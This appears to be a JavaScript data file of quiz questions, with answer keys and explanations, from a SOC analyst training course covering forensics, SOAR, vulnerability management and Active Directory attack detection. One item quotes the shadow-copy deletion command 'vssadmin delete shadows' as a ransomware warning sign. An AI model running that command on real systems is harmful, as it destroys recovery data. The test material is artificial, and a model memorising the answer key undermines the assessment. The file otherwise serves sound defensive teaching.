      { id: "sap-q9-7", question: "What is a super timeline?", options: ["A very long timeline tracking the history of all projects in the security department.", "A timeline combining metadata timestamps from 100+ distinct system artifact sources.", "A project management timeline tracking the schedule of security controls updates.", "A real-time database stream visualizing active alerts in the SIEM dashboard."], correctAnswer: 1, explanation: "A super timeline merges timestamps from file system, event logs, registry, browser, and more into one view." },
      { id: "sap-q9-8", question: "What tool creates super timelines?", options: ["Wireshark, which reconstructs network streams and exports files from captures.", "Plaso (log2timeline), which extracts timestamps from 100+ sources to build timelines.", "Nmap, which scans ports and identifies remote operating system versions.", "Burp Suite, which intercepts HTTP requests and audits web application security."], correctAnswer: 1, explanation: "Plaso (log2timeline) extracts timestamps from 100+ sources and creates comprehensive super timelines." },
      { id: "sap-q9-9", question: "What survives secure file deletion?", options: ["The complete file data contents, remaining fully intact in unallocated clusters.", "Nothing at all, as secure deletion overwrites all sectors multiple times.", "USN Journal records of the change, and Prefetch logs of the deletion tool execution.", "Only the original filename, remaining in its parent directory index blocks."], correctAnswer: 2, explanation: "USN Journal records the deletion event, and Prefetch records execution of the deletion tool." },
      { id: "sap-q9-10", question: "What is an Alternate Data Stream (ADS)?", options: ["A backup network protocol used to mirror log files to redundant database indices.", "A hidden data stream attached to an NTFS file to hide payloads from standard view.", "A compressed file format used to save disk space on database backup servers.", "An encryption algorithm defining key exchange rules for virtual containers."], correctAnswer: 1, explanation: "NTFS ADS allows hiding data within existing files — attackers use them to conceal malicious payloads." },
      { id: "sap-q9-11", question: "What should you NEVER do with original evidence?", options: ["Generate hash values for the evidence files and document system properties.", "Take physical photographs of the evidence and record serial numbers.", "Perform direct analysis on original media, which risks modifying evidence logs.", "Create working copies of the evidence and verify hashes before beginning analysis."], correctAnswer: 2, explanation: "Always create working copies — analyzing original evidence risks modification that destroys legal admissibility." },
      { id: "sap-q9-12", question: "What does the $UsnJrnl artifact record?", options: ["Detailed user login and logoff session events on domain controllers.", "File system changes including creations, deletions, renames, and modifications.", "Network connections and connection duration statistics for host interfaces.", "Registry configuration updates and security settings changes across the OS."], correctAnswer: 1, explanation: "The USN (Update Sequence Number) Journal records all file system changes including creates, deletes, and renames." },
      { id: "sap-q9-13", question: "Best approach for timeline analysis?", options: ["Starting from the absolute beginning of log history records and working forward.", "Pivoting from known compromise events and expanding the timeline window outward.", "Limiting the timeline review window exclusively to the last 24 hours of logs.", "Randomly selecting log samples from different directories to check for anomalies."], correctAnswer: 1, explanation: "Pivot from known events (malware detection, alert time) and expand outward to build the full picture." },
      { id: "sap-q9-14", question: "How does fileless malware evade disk forensics?", options: ["Encrypting the entire physical disk partition to prevent access to directories.", "Executing and running entirely in volatile system memory (RAM) without writing files.", "Using extremely small file sizes that fall below the scan thresholds of tools.", "Hiding file structures inside protected operating system system folders."], correctAnswer: 1, explanation: "Fileless malware loads and executes in memory, leaving no traditional file-based artifacts for disk forensics." },
      { id: "sap-q9-15", question: "Key principle of anti-forensics detection?", options: ["Threat actors always succeed in completely wiping all evidence from systems.", "The act of destroying evidence (clearing logs, timestomping) leaves its own traces.", "Forensic evidence cannot be recovered once any secure deletion tool runs.", "Only highly advanced proprietary software tools can detect anti-forensic actions."], correctAnswer: 1, explanation: "The act of destroying evidence (clearing logs, timestomping, secure deletion) creates new artifacts that analysts can find." }
    ]
  },
  {
    quizId: "sap-q10",
    courseId: "soc-analyst-path",
    title: "Security Automation & SOAR Quiz",
    description: "Test your SOAR platform knowledge, playbook design, and API integration skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q10-1", question: "What does SOAR stand for?", options: ["Security Operations and Response, managing alert queues and analyst desk workloads.", "Security Orchestration, Automation, and Response, integrating tools and workflows.", "System Orchestration and Remediation, focusing on patch management and backups.", "Security Operations Automated Runbooks, which is a legacy brand name for SOAR."], correctAnswer: 1, explanation: "SOAR = Security Orchestration, Automation, and Response — combining tool integration, task automation, and incident response." },
      { id: "sap-q10-2", question: "What is the recommended first step when implementing SOAR?", options: ["Automating all containment and host blocking rules immediately on day one.", "Starting with alert enrichment automation to accelerate analyst triage decisions safely.", "Replacing all tier 1 security analysts with automated response bots and scripts.", "Deploying the most complex, expensive orchestration platform available in the market."], correctAnswer: 1, explanation: "Starting with enrichment is low-risk and high-value — it speeds up analyst decisions without risk of automated blocking mistakes." },
      { id: "sap-q10-3", question: "What HTTP status code indicates API rate limiting?", options: ["HTTP 401 Unauthorized, indicating missing or invalid API authentication keys.", "HTTP 403 Forbidden, indicating the key does not have permissions for the resource.", "HTTP 429 Too Many Requests, indicating the client has exceeded rate limits.", "HTTP 503 Service Unavailable, indicating the API server is down for maintenance."], correctAnswer: 2, explanation: "HTTP 429 indicates the client has sent too many requests — implement retry with backoff when received." },
      { id: "sap-q10-4", question: "In a phishing response playbook, what should happen BEFORE automated blocking?", options: ["Sending an automated notification email warning the user of security violations.", "Extracting and enriching email indicators (IPs, URLs, hashes) to confirm threat status.", "Purging the email from all corporate user mailboxes without performing analysis.", "Resetting active password credentials for all users who received the email."], correctAnswer: 1, explanation: "IOC extraction and enrichment must confirm the email is malicious before automated blocking to avoid disrupting legitimate communications." },
      { id: "sap-q10-5", question: "What is the primary benefit of idempotent playbooks?", options: ["Ensuring that the orchestration playbook runs faster by utilizing compressed libraries.", "Designing actions to be safe to execute multiple times without causing side effects.", "Reducing system memory usage during the execution of automation scripts.", "Eliminating the need for software testing before deploying to production systems."], correctAnswer: 1, explanation: "Idempotent playbooks produce the same result regardless of how many times they run — critical for reliability in automated security response." },
      { id: "sap-q10-6", question: "Which Python library is essential for making HTTP requests to security APIs?", options: ["pandas, which is used for data analysis, manipulation, and structured tables.", "requests, which is the standard library used to execute HTTP API calls in Python.", "matplotlib, which generates charts and graphical visualizations of log metrics.", "numpy, which provides support for large multi-dimensional arrays and math formulas."], correctAnswer: 1, explanation: "The requests library is the standard for HTTP API calls in Python — used for VirusTotal, CrowdStrike, and other security tool integrations." },
      { id: "sap-q10-7", question: "What metric best measures SOAR effectiveness?", options: ["The total number of playbooks created and stored in the security repository.", "The reduction in Mean Time to Respond (MTTR) for automated incident types.", "The raw volume of API calls executed daily by the orchestration engine.", "The number of distinct third-party security tool integrations configured."], correctAnswer: 1, explanation: "MTTR reduction directly measures how automation speeds up incident response — the core goal of SOAR implementation." },
      { id: "sap-q10-8", question: "When should a SOAR playbook escalate to a human analyst?", options: ["Never, as the main goal of SOAR is to achieve complete, hands-off automation.", "When the situation requires qualitative judgment on business impact or is novel.", "Only during standard corporate business hours when Tier 2 analysts are online.", "Immediately after every single automated enrichment action is completed."], correctAnswer: 1, explanation: "Automation handles known scenarios; humans make judgment calls on business impact, novel threats, and high-risk containment decisions." },
      { id: "sap-q10-9", question: "What authentication method is most secure for API integrations?", options: ["Hardcoding administrative API keys directly inside the automation source code files.", "OAuth 2.0 with token refresh and secure credential storage in a secrets vault.", "Basic authentication sending credentials in cleartext over unencrypted HTTP channels.", "Sharing static passwords among multiple integration services and developer teams."], correctAnswer: 1, explanation: "OAuth 2.0 with vault-stored secrets provides secure, auditable, and rotatable authentication for API integrations." },
      { id: "sap-q10-10", question: "How can SOC automation reduce alert fatigue?", options: ["Disabling highly sensitive correlation rules to prevent alert queue paging.", "Auto-closing known false positives and enriching remaining alerts with context.", "Consolidating all security tools into a single database search portal.", "Increasing analyst headcount to distribute the workload of alert reviews."], correctAnswer: 1, explanation: "Automation filters noise by auto-closing known false positives and enriching real alerts, letting analysts focus on genuine threats." }
    ]
  },
  {
    quizId: "sap-q11",
    courseId: "soc-analyst-path",
    title: "Vulnerability Management Quiz",
    description: "Assess vulnerability scanning, CVSS scoring, and remediation workflow knowledge.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q11-1", question: "What is the correct order of the vulnerability management lifecycle?", options: ["Patching host systems first, followed by scanning for bugs and writing reports.", "Discover/Scan systems, Assess severity, Prioritize, Remediate/Patch, and Verify.", "Scanning vulnerabilities first, fixing them immediately, and archiving logs.", "Writing executive reports first, followed by scanning and remediation updates."], correctAnswer: 1, explanation: "The VM lifecycle is continuous: Discover/Scan → Assess/Classify → Prioritize/Plan → Remediate/Patch → Verify/Report." },
      { id: "sap-q11-2", question: "What does CVSS stand for?", options: ["Common Vulnerability Scanning System — a tool for running automated audits.", "Common Vulnerability Scoring System — a standardized framework for rating severity.", "Cyber Vulnerability Security Score — a qualitative scoring metric used by firewalls.", "Critical Vulnerability Status System — a database tracking missing patches."], correctAnswer: 1, explanation: "CVSS = Common Vulnerability Scoring System — a standardized framework for rating vulnerability severity on a 0-10 scale." },
      { id: "sap-q11-3", question: "A vulnerability has CVSS 6.1 but EPSS 0.85. How should you prioritize it?", options: ["Assign low remediation priority because the CVSS score is only in the moderate range.", "Assign high priority because EPSS indicates a high probability of exploitation in the wild.", "Ignore the vulnerability entirely as it does not meet the CVSS critical score threshold.", "Wait for the vendor to release an updated software patch before scheduling remediation."], correctAnswer: 1, explanation: "EPSS 0.85 means 85% chance of exploitation in 30 days — this overrides the moderate CVSS score and demands urgent attention." },
      { id: "sap-q11-4", question: "What is the advantage of credentialed vulnerability scans over unauthenticated?", options: ["Executing scans significantly faster, minimizing network bandwidth consumption.", "Providing deep visibility into installed software, configurations, and patch status.", "Reducing operational disruptions and avoiding triggering security alarms.", "Eliminating the requirement for active network connections to target endpoints."], correctAnswer: 1, explanation: "Credentialed scans log into systems to check installed patches, software versions, and configurations — far more accurate than external probing." },
      { id: "sap-q11-5", question: "What is CISA KEV?", options: ["A commercial vulnerability scanning engine focusing on cloud platforms.", "A catalog of Known Exploited Vulnerabilities requiring urgent prioritization.", "An online calculator used to determine custom CVSS environmental scores.", "An automated patch management tool that deploys updates to host databases."], correctAnswer: 1, explanation: "CISA KEV (Known Exploited Vulnerabilities) catalogs CVEs actively exploited in the wild — any CVE on the list demands immediate priority." },
      { id: "sap-q11-6", question: "When patching is not possible, what should be implemented?", options: ["Accept the risk silently without implementing any additional security measures.", "Implement compensating controls like network segmentation, WAF rules, and monitoring.", "Decommission the affected systems and delete them from the active IT inventory.", "Disable all network access for the system, making it completely offline permanently."], correctAnswer: 1, explanation: "Compensating controls (segmentation, virtual patching, monitoring) reduce risk when direct patching isn't feasible — plus documented risk acceptance." },
      { id: "sap-q11-7", question: "What is Attack Surface Management?", options: ["Managing firewall access lists and configuring perimeter security group rules.", "Continuous discovery, inventory, and monitoring of all internet-facing assets.", "Conducting regular security awareness training sessions for corporate employees.", "Deploying and managing antivirus software agents across all local endpoint devices."], correctAnswer: 1, explanation: "ASM continuously discovers, inventories, and monitors all external-facing assets including shadow IT and third-party services." },
      { id: "sap-q11-8", question: "What is the typical remediation SLA for a critical vulnerability?", options: ["A standard timeframe of 90 days, allowing for testing cycles.", "A standard timeframe of 30 days, matching monthly patch deployment schedules.", "An urgent timeframe of 24-48 hours, especially if actively exploited in the wild.", "A long timeframe of 1 year, aligned with standard annual regulatory audits."], correctAnswer: 2, explanation: "Critical vulnerabilities (actively exploited, remote code execution) typically require remediation within 24-48 hours." },
      { id: "sap-q11-9", question: "How should vulnerability risk be communicated to executives?", options: ["Sharing raw CVSS base score tables and technical vulnerability descriptions.", "Translating technical risk to business impact: downtime, compliance fines, and costs.", "Forwarding the complete, raw PDF scan report directly to executive mailboxes.", "Only discussing vulnerability status when explicitly asked during annual reviews."], correctAnswer: 1, explanation: "Executives need business context: customer impact, financial risk, regulatory consequences — not technical CVSS details." },
      { id: "sap-q11-10", question: "What tool is commonly used for open-source vulnerability scanning?", options: ["Nessus, which is a commercial vulnerability scanner owned by Tenable.", "Qualys, which provides cloud-based vulnerability management subscription services.", "OpenVAS (Greenbone), which is a comprehensive open-source vulnerability scanner.", "CrowdStrike Falcon, which provides EDR and endpoint asset protection solutions."], correctAnswer: 2, explanation: "OpenVAS (now Greenbone Community Edition) is the leading open-source vulnerability scanner with 80,000+ NVTs." }
    ]
  },
  {
    quizId: "sap-q12",
    courseId: "soc-analyst-path",
    title: "Advanced Attack Techniques Exam",
    description: "Evaluate AD attacks, lateral movement, ransomware analysis, and purple team skills.",
    passingScore: 80,
    timeLimit: 30,
    questions: [
      { id: "sap-q12-1", question: "What Windows Event ID indicates a Kerberos service ticket request (Kerberoasting)?", options: ["Event ID 4624, logging successful logon authentication sessions on Windows hosts.", "Event ID 4769, logging Kerberos service ticket requests (TGS) with RC4 encryption.", "Event ID 7045, logging the installation of a new background service on systems.", "Event ID 1102, which is generated when the Security audit log is manually cleared."], correctAnswer: 1, explanation: "Event ID 4769 logs Kerberos service ticket operations — RC4 encryption type (0x17) from a single account requesting many tickets indicates Kerberoasting." },
      { id: "sap-q12-2", question: "In a Pass-the-Hash attack, what does the attacker use to authenticate?", options: ["The plaintext password of the user, cracked using external offline tools.", "The NTLM password hash directly, bypassing the need for the plaintext password.", "A forged Kerberos ticket containing custom domain admin group identifiers.", "An active session cookie intercepted during unencrypted web communications."], correctAnswer: 1, explanation: "PtH uses the NTLM hash as-is for authentication — NTLM protocol accepts the hash without needing the plaintext password." },
      { id: "sap-q12-3", question: "What is a DCSync attack?", options: ["Synchronizing directory clocks on Domain Controllers to prevent timing errors.", "Impersonating Domain Controller replication requests to extract password hashes.", "Syncing local DNS server caches to resolve domain name queries faster.", "Synchronizing Active Directory user directories with cloud identity platforms."], correctAnswer: 1, explanation: "DCSync uses replication protocol permissions to request password hashes from a Domain Controller — detected via Event ID 4662." },
      { id: "sap-q12-4", question: "Which Windows Event ID records service installation (PsExec detection)?", options: ["Event ID 4624, which tracks successful local and remote user login events.", "Event ID 4688, logging process creation events and parent process command lines.", "Event ID 7045, logging new service installations (e.g. PSEXESVC on the system).", "Event ID 4769, tracking Kerberos ticket requests and authentication tickets."], correctAnswer: 2, explanation: "Event ID 7045 records new service installation — PsExec creates the PSEXESVC service on target machines." },
      { id: "sap-q12-5", question: "What is the first indicator of ransomware pre-encryption activity?", options: ["The initial appearance of the ransom note text file on user desktop screens.", "Commands deleting Volume Shadow Copies (vssadmin delete shadows) to block recovery.", "The mass modification and file renaming activity occurring in directory folders.", "A sudden increase in outbound network connection volume to external IP addresses."], correctAnswer: 1, explanation: "Attackers delete Volume Shadow Copies before encryption — detecting 'vssadmin delete shadows' is an early warning to prevent encryption." },
      { id: "sap-q12-6", question: "What was the primary attack vector in the SolarWinds supply chain attack?", options: ["Targeted spear-phishing emails containing malicious document macro payloads.", "A compromised software build system injecting a backdoor into legitimate updates.", "Exploiting vulnerable remote VPN gateways to gain initial access to networks.", "Deploying infected USB drives at the organization's physical corporate offices."], correctAnswer: 1, explanation: "Attackers compromised SolarWinds' build system to inject the SUNBURST backdoor into legitimate Orion software updates." },
      { id: "sap-q12-7", question: "How does deception technology help detect lateral movement?", options: ["Blocking all network connections that originate from unrecognized source IP addresses.", "Deploying decoy credentials, files, and systems that alert on any interaction.", "Encrypting all network communications to prevent traffic inspection by threat agents.", "Accelerating user authentication processes across Active Directory domain networks."], correctAnswer: 1, explanation: "Decoy credentials, shares, and systems have no legitimate use — any interaction is a high-confidence indicator of malicious activity." },
      { id: "sap-q12-8", question: "What behavioral indicator suggests zero-day document exploitation?", options: ["A user opening a large PDF document from an unrecognized external email sender.", "A Microsoft Office application spawning command interpreters like cmd.exe or PowerShell.", "An email gateway logging an incoming message containing an encrypted zip attachment.", "A PDF document requiring administrative privileges to display graphic components."], correctAnswer: 1, explanation: "Office apps should never spawn command interpreters — Word/Excel launching cmd.exe or PowerShell strongly indicates exploit payload execution." },
      { id: "sap-q12-9", question: "What is the purpose of Atomic Red Team?", options: ["A commercial penetration testing service providing annual threat modeling audits.", "A framework of small, focused tests mapped to MITRE ATT&CK to validate detections.", "A host-based antivirus agent that blocks malicious program execution in real time.", "A structured threat intelligence feed providing real-time indicators of compromise."], correctAnswer: 1, explanation: "Atomic Red Team provides small, focused test cases for each ATT&CK technique — enabling repeatable detection validation." },
      { id: "sap-q12-10", question: "In a purple team exercise scorecard, what three levels should be tracked per technique?", options: ["Fast, Medium, and Slow execution speeds of defensive alerts and response times.", "Logged (visibility), Alerted (detection), and Blocked (prevention) categories.", "Red, Yellow, and Green priority levels assigned to corporate host systems.", "Low, Medium, and High severity ratings tracking overall threat vulnerabilities."], correctAnswer: 1, explanation: "Track whether each technique was Logged (visibility), Alerted (detection), and Blocked (prevention) to measure detection maturity." },
      { id: "sap-q12-11", question: "What percentage of ransomware victims who pay are targeted again?", options: ["Approximately 10% of victims who pay are targeted in a subsequent attack.", "Approximately 30% of victims who pay suffer repeat ransomware encryption events.", "Approximately 80% of organizations that pay ransom are attacked a second time.", "0%, as threat groups maintain strict honor codes to ensure payment credibility."], correctAnswer: 2, explanation: "Studies show approximately 80% of organizations that pay ransom are attacked again — payment signals willingness to pay." },
      { id: "sap-q12-12", question: "What is dependency confusion in supply chain attacks?", options: ["Developer confusion regarding software library version numbers and updates.", "Tricking build managers into pulling malicious public packages instead of private ones.", "Importing too many redundant third-party libraries inside web applications.", "A software compiler error caused by mismatched runtime version dependencies."], correctAnswer: 1, explanation: "Dependency confusion publishes malicious packages on public registries with the same name as internal packages — build systems may prefer the public version." },
      { id: "sap-q12-13", question: "What defense prevents Golden Ticket attacks?", options: ["Configuring strict network firewall access list rules on perimeter gateways.", "Rotating the KRBTGT account password twice, separated by at least 12 hours.", "Deploying the most recent security signature updates to host-based antiviruses.", "Implementing strict logical network segmentation to isolate domain subnets."], correctAnswer: 1, explanation: "Golden Tickets are forged using the KRBTGT hash — rotating it twice invalidates all existing tickets including forged ones." },
      { id: "sap-q12-14", question: "How do you detect WMI-based lateral movement?", options: ["Checking network perimeter firewall traffic logs for failed connections.", "Monitoring the wmiprvse.exe process spawning command interpreters like cmd.exe.", "Reviewing email gateway logs for incoming phishing messages and attachments.", "Analyzing recursive DNS server query logs for high-entropy dynamic domains."], correctAnswer: 1, explanation: "Remote WMI execution causes wmiprvse.exe to spawn child processes — unexpected children like cmd.exe or PowerShell indicate lateral movement." },
      { id: "sap-q12-15", question: "What is the average dwell time for modern ransomware before encryption?", options: ["A very short timeframe of a few minutes, executing immediately upon initial compromise.", "A timeframe of 5 to 14 days, during which operators steal credentials and exfiltrate data.", "A long timeframe of 6 months, establishing deep stealthy persistence in the network.", "An intermediate timeframe of 1 hour, allowing for localized host scans."], correctAnswer: 1, explanation: "Modern ransomware operators spend 5-14 days in the network performing reconnaissance, credential theft, and data exfiltration before encrypting." }
    ]
  },
  {
    quizId: "sap-q13",
    courseId: "soc-analyst-path",
    title: "SOC Analyst Certification Exam",
    description: "Comprehensive final exam covering all 12 modules. You must pass this exam with 80% or higher to earn your SOC Analyst Learning Path certificate.",
    passingScore: 80,
    timeLimit: 90,
    questions: [
      { id: "sap-q13-1", question: "In the SOC-CMM model, which level indicates processes are documented, standardized, and measured?", options: ["Level 1 – Initial: processes are ad-hoc, undocumented, and unpredictable with high reliance on individual heroics.", "Level 2 – Managed: processes are defined at project levels but active tracking is limited to critical incidents.", "Level 3 – Defined: processes are documented and standardized across the entire organization but lack metrics.", "Level 4 – Quantitatively Managed: processes are measured with KPIs and managed using data-driven decisions."], correctAnswer: 3, explanation: "Level 4 (Quantitatively Managed) means processes are measured with KPIs and managed using data-driven decisions." },
      { id: "sap-q13-2", question: "A SOC analyst discovers a breach involving EU citizen data. Under GDPR, what is the maximum notification window to the supervisory authority?", options: ["The organization is required to notify the supervisory authority within 24 hours of validating the breach.", "The organization is required to notify the supervisory authority within 48 hours of completing containment.", "The organization is required to notify the supervisory authority within 72 hours of becoming aware of it.", "The organization is required to notify the supervisory authority within 7 days of identifying the compromise."], correctAnswer: 2, explanation: "GDPR Article 33 requires notification within 72 hours of becoming aware of a personal data breach." },
      { id: "sap-q13-3", question: "What is the primary difference between a L1 and L2 SOC analyst?", options: ["L2 analysts operate advanced EDR tooling while L1 analysts are restricted to passive firewall log viewers.", "L1 analysts perform initial alert triage while L2 analysts conduct deeper investigation and containment.", "L2 analysts focus exclusively on GRC compliance audits while L1 analysts handle technical alert queues.", "L1 analysts write custom SIEM detection rules while L2 analysts focus entirely on hardware maintenance."], correctAnswer: 1, explanation: "L1 analysts perform initial alert triage and escalation, while L2 analysts conduct deeper investigation, threat correlation, and containment." },
      { id: "sap-q13-4", question: "During packet analysis, you observe a TCP connection with SYN, SYN-ACK, then RST. What does this indicate?", options: ["A successful TCP handshake establishing a persistent session between the active client and server endpoints.", "A half-open or stealth port scan where the scanner sends a RST packet instead of completing the handshake.", "A classic FIN scan designed to identify active listening services on the target without sending SYN flags.", "A standard network connection timeout caused by high routing latency or firewall packet drops on ports."], correctAnswer: 1, explanation: "SYN → SYN-ACK → RST is a classic half-open (stealth) port scan — the scanner sends RST instead of completing the handshake." },
      { id: "sap-q13-5", question: "Which DNS record type is commonly abused for data exfiltration via DNS tunneling?", options: ["A records, which map hostname text directly to standard IPv4 address structures on the network.", "MX records, which identify the designated mail exchange servers authorized to accept incoming emails.", "TXT records, which can carry arbitrary text payloads, making them ideal for encoding exfiltrated data.", "SOA records, containing administrative details about the authoritative zone properties and timings."], correctAnswer: 2, explanation: "TXT records can carry arbitrary text data, making them ideal for DNS tunneling and data exfiltration." },
      { id: "sap-q13-6", question: "You see HTTP traffic with unusually long GET parameters containing Base64-encoded strings. What attack technique should you suspect?", options: ["SQL injection, attempting to bypass input sanitization and execute queries on backend databases.", "C2 beaconing via HTTP, embedding encoded command strings inside URL fields to evade detection.", "Cross-site scripting, attempting to inject malicious client-side script code into trusted web pages.", "Directory traversal, targeting web server input vulnerabilities to access restricted system files."], correctAnswer: 1, explanation: "C2 (Command and Control) beacons often embed encoded commands in HTTP GET parameters to blend with normal web traffic." },
      { id: "sap-q13-7", question: "In Splunk SPL, what does the 'stats dc(src_ip) as unique_sources by dest_port' query calculate?", options: ["The total volume of outbound network traffic transmitted through each active port over the time window.", "Count of distinct source IP addresses connecting to each specific destination port in the dataset.", "The average network connection duration calculated across all logical subnets in the organization.", "The total number of failed user login authentication attempts grouped by domain controller hosts."], correctAnswer: 1, explanation: "dc() counts distinct values — this query finds how many unique source IPs connected to each destination port, useful for detecting port scans." },
      { id: "sap-q13-8", question: "A SIEM correlation rule triggers when 5+ failed logins from the same IP are followed by a successful login within 10 minutes. What attack does this detect?", options: ["A spear-phishing attack attempting to harvest credentials using spoofed corporate login portals.", "A brute-force or password-spraying attempt that succeeded in identifying a valid credential pair.", "Lateral movement, where an attacker leverages compromised active sessions to access internal hosts.", "Privilege escalation, attempting to elevate user permissions from local accounts to domain admins."], correctAnswer: 1, explanation: "Multiple failures followed by success is the classic signature of a successful brute-force or password-spraying attack." },
      { id: "sap-q13-9", question: "What is the biggest risk of overly sensitive SIEM correlation rules?", options: ["Completely missing real, stealthy attacks that bypass basic correlation thresholds.", "Alert fatigue leading to analysts ignoring or auto-closing alerts, potentially missing real threats.", "Significant increases in database log storage and ingestion costs on cloud SIEM platforms.", "Severely degraded search execution speed and query performance across active user dashboards."], correctAnswer: 1, explanation: "Overly sensitive rules generate excessive false positives, causing alert fatigue — analysts start ignoring or auto-closing alerts, missing real threats." },
      { id: "sap-q13-10", question: "Which Windows registry key is commonly used by malware for persistence via auto-start?", options: ["HKLM\\SYSTEM\\CurrentControlSet, which stores device driver configurations and active system services.", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, which executes program payloads at user logon.", "HKLM\\SOFTWARE\\Classes, mapping file extensions to application associations and handler systems.", "HKCU\\Control Panel\\Desktop, defining client workstation desktop background images and structures."], correctAnswer: 1, explanation: "The Run/RunOnce keys under CurrentVersion execute programs at user logon — a top persistence mechanism for malware." },
      { id: "sap-q13-11", question: "You find a suspicious process with PID 4892 spawned by PowerShell. Which Windows Event ID would log this process creation?", options: ["Event ID 4624, logging successful logon authentication sessions on local and remote systems.", "Event ID 4688, logging process creation details including parent command line and user context.", "Event ID 7045, logging new service installations (e.g. background execution drivers) on Windows.", "Event ID 1102, which is generated when the Security audit log is manually cleared by users."], correctAnswer: 1, explanation: "Event ID 4688 (Process Creation) logs new process details including parent process, command line, and user context." },
      { id: "sap-q13-12", question: "On Linux, an attacker adds a cron job for persistence. Where would you find it?", options: ["/etc/passwd, which lists local user accounts, user IDs, and default shell locations.", "/var/log/auth.log, recording user authentication events and privilege escalation history.", "/etc/crontab and user-specific configuration files stored under /var/spool/cron/ directories.", "/proc/meminfo, displaying real-time system memory usage, buffers, and swap statistics."], correctAnswer: 2, explanation: "Cron persistence is found in /etc/crontab, /etc/cron.d/, and user-specific files under /var/spool/cron/." },
      { id: "sap-q13-13", question: "An email passes SPF but fails DKIM. The 'From' header shows company.com but 'Return-Path' shows attacker.xyz. What is this?", options: ["A legitimate email sent from external marketing partners utilizing approved relay servers.", "An SPF-aligned spoofing attempt where the sending IP matches SPF records of the spoofed domain.", "A domain impersonation attack using custom Return-Path values to bypass basic SPF checks.", "A DMARC pass event confirming alignment between both cryptographic and routing domain headers."], correctAnswer: 2, explanation: "The attacker configured SPF for their domain (attacker.xyz) but spoofed the visible 'From' header — DKIM failure and mismatched domains confirm spoofing." },
      { id: "sap-q13-14", question: "You receive a phishing email with a .html attachment. What is the most likely attack technique?", options: ["A macro-based malware delivery method targeting vulnerabilities inside Microsoft Word documents.", "HTML smuggling using JavaScript within the attachment to assemble and execute malicious payloads.", "A man-in-the-browser attack injecting malicious script components directly into active browsers.", "A DNS poisoning attack designed to redirect the victim user to credential harvesting servers."], correctAnswer: 1, explanation: "HTML smuggling uses JavaScript in .html attachments to reconstruct and download malicious payloads, bypassing email gateway file-type scanning." },
      { id: "sap-q13-15", question: "During a ransomware incident, what is the FIRST action an analyst should take?", options: ["Pay the demanded ransom immediately using digital currency to prevent database exposure.", "Wipe and rebuild affected host operating systems from backup images without delay.", "Isolate the compromised system from the network immediately to prevent lateral spread.", "Notify external media outlets and compliance regulators regarding the potential data breach."], correctAnswer: 2, explanation: "Immediate network isolation prevents lateral spread while preserving evidence for investigation." },
      { id: "sap-q13-16", question: "What is the correct order of the NIST incident response lifecycle?", options: ["Detect immediate system threats, Contain affected endpoints, Eradicate malware, and Recover host systems.", "Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident lessons learned.", "Identify assets, Protect systems, Detect network anomalies, Respond to indicators, and Recover databases.", "Triage incoming alert queues, Investigate indicators, Remediate security gaps, and Close the ticket."], correctAnswer: 1, explanation: "NIST SP 800-61 defines four phases: Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident Activity." },
      { id: "sap-q13-17", question: "Chain of custody documentation must include all EXCEPT:", options: ["A detailed list of all investigators who physically or logically handled the evidence files.", "The precise timestamps of when the evidence was transferred or accessed by security analysts.", "The analyst's personal opinion regarding the guilt or motives of the suspected threat agent.", "Cryptographic hash values of digital evidence to verify bit-for-bit integrity and soundness."], correctAnswer: 2, explanation: "Chain of custody tracks who, when, where, and integrity (hashes) — personal opinions have no place in evidence documentation." },
      { id: "sap-q13-18", question: "An AWS CloudTrail log shows 'DeleteTrail' API call from an unfamiliar IAM user. What is the severity?", options: ["Low severity, representing a routine automated log clean-up event performed by administrative services.", "Medium severity, indicating a potential configuration update that requires standard review and validation.", "Critical severity, representing defense evasion as attackers disable logging to cover active tracks.", "Informational severity, indicating the CloudTrail service was scheduled for routine maintenance windows."], correctAnswer: 2, explanation: "Deleting CloudTrail is a critical indicator of an attacker attempting to disable logging and cover their tracks." },
      { id: "sap-q13-19", question: "In Azure, which log source records sign-in activity including MFA status and conditional access results?", options: ["Azure Activity Logs, which capture subscription-level operations and resource modification events.", "Azure AD Sign-in Logs, recording authentication metadata, user location details, and MFA status.", "Azure Resource Logs, tracking data plane operations within specific configured storage services.", "Azure NSG Flow Logs, capturing network IP traffic metadata passing through virtual gateway systems."], correctAnswer: 1, explanation: "Azure AD Sign-in Logs capture authentication events including MFA challenges, conditional access policy results, and sign-in risk." },
      { id: "sap-q13-20", question: "A Kubernetes pod is running with 'privileged: true' security context. Why is this a critical finding?", options: ["The container consumes significantly more host memory resources and can cause service performance drops.", "The container has unrestricted access to the host kernel, enabling container escape to the host node.", "The container is isolated from internal network routing and cannot connect to other cluster services.", "The container completely bypasses the cluster's ingress configurations and local load balancing rules."], correctAnswer: 1, explanation: "Privileged containers have unrestricted host access — an attacker inside can escape to the host node and compromise the cluster." },
      { id: "sap-q13-21", question: "What is the difference between strategic and tactical threat intelligence?", options: ["Strategic intelligence is designed for technical SOC analysts, while tactical is focused on executives.", "Strategic TI informs high-level business risk decisions; tactical TI provides actionable IOCs to defenders.", "They are identical threat intelligence terms that are used interchangeably across security standards.", "Strategic TI relies entirely on automated feeds, while tactical TI requires manual research extraction."], correctAnswer: 1, explanation: "Strategic TI informs executive risk decisions (trends, actor motivations); tactical TI provides actionable IOCs and TTPs for SOC analysts." },
      { id: "sap-q13-22", question: "In a hypothesis-driven hunt, you hypothesize 'attackers are using living-off-the-land binaries.' Which data source is MOST relevant?", options: ["External perimeter firewall connection logs tracking outbound TCP traffic volume on standard web ports.", "Endpoint process creation logs (like Event ID 4688) containing complete command-line configurations.", "Physical badge access logs monitoring employee movements in secure server rooms and office buildings.", "DHCP server lease duration records showing IP address assignments to wireless client hosts on network."], correctAnswer: 1, explanation: "LOLBin hunting requires process creation logs (Sysmon Event 1 / Windows 4688) with full command-line recording to spot abuse of legitimate tools." },
      { id: "sap-q13-23", question: "What STIX object type represents an adversary group like APT29?", options: ["STIX Indicator, containing patterns used to detect the presence of cyber threat actor activities.", "STIX Intrusion Set, representing a grouped set of adversary behaviors, TTPs, and shared targets.", "STIX Observed Data, capturing raw threat log metadata observed on local host network interfaces.", "STIX Course of Action, detailing recommendations and response actions to remediate active threats."], correctAnswer: 1, explanation: "Intrusion Set represents a named threat actor group with associated TTPs, motivations, and attributed campaigns." },
